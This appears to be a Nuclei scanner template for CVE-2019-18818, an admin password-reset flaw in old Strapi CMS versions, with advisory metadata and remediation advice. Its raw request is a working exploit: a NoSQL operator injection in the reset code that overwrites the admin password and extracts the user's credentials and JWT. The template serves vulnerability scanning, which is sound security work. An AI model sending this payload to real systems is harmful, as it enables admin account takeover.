id: CVE-2019-18818
info:
  name: strapi CMS <3.0.0-beta.17.5 - Admin Password Reset
  author: idealphase
  severity: critical
  description: Strapi CMS before version 3.0.0-beta.17.5 allows admin password resets
    due to improper handling of password reset requests in two specific controller
    files.
  reference:
  - https://github.com/advisories/GHSA-6xc2-mj39-q599
  - https://www.exploit-db.com/exploits/50239
  - https://nvd.nist.gov/vuln/detail/CVE-2019-18818
  - https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.5
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-18818
    cwe-id: CWE-640
  tags: cve2019,strapi,auth-bypass,intrusive,edb,cve
  metadata:
    impact: The impact of CVE-2019-18818 in strapi CMS before 3.0.0-beta.17.5 is that
      it allows for unauthorized admin password resets, which compromises the security
      of the system.
    recommendation: It is recommended to update to strapi CMS version 3.0.0-beta.17.5
      or higher to avoid the vulnerability CVE-2019-18818 which allows for unauthorized
      admin password resets.
requests:
- raw:
  - 'POST /admin/auth/reset-password HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/json


    {"code": {"$gt": 0}, "password": "SuperStrongPassword1", "passwordConfirmation":
    "SuperStrongPassword1"}

    '
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - application/json
    part: header
  - type: word
    condition: and
    words:
    - '"username":'
    - '"email":'
    - '"jwt":'
    part: body
  extractors:
  - type: json
    json:
    - .user.username
    - .user.email
